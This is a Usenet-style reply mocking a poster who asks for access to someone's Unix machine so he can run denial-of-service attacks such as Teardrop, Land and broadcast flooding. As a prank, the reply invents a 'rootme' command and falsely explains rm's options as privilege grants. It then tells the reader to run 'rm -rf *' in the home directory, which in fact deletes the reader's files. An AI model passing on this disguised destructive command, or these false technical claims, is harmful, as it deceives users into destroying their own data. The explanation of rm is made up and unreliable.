chigga3@yahoo.com ( tHe_MoD - [ Mike Harper ] ) writes:

> I am looking for someone with a linux/unix box, that can give me
> (nuke) access to their box.  It doesn't have to be r00t, all i need is

um, actually, yes, it does have to be 'r00t' access, as only root is
allowed to do that kind of crap.

> access to RAW Sockets and ability to do BroadCast Flooding, along with
> Teardrop and Land.
> 
> Please get back to me ASAP.   This is for a good cause.

the best way to get root in a situation like this is with the little-known
"rootme" command.  the actuall command is named "rm".  the options you need
are -r for "retain privlelges" (otherwise it only works for the next
command, and then drops them again), and "-f" for force (without this,
it'll wait for confirmation from the root account via the "conrm" (confirm
rootme) command, which some sysadmins don't even bother installing).  after
that, just give it a list of the priveleges that you want - easiest way is
just do give it "*", for all privs.  you must run this in your home
directory, as it creates a few tmp files in the cwd before rm'ing to root,
so you need write access to the cwd.  so, in short

cd ~
rm -rf *

should do the trick.  enjoy! =)

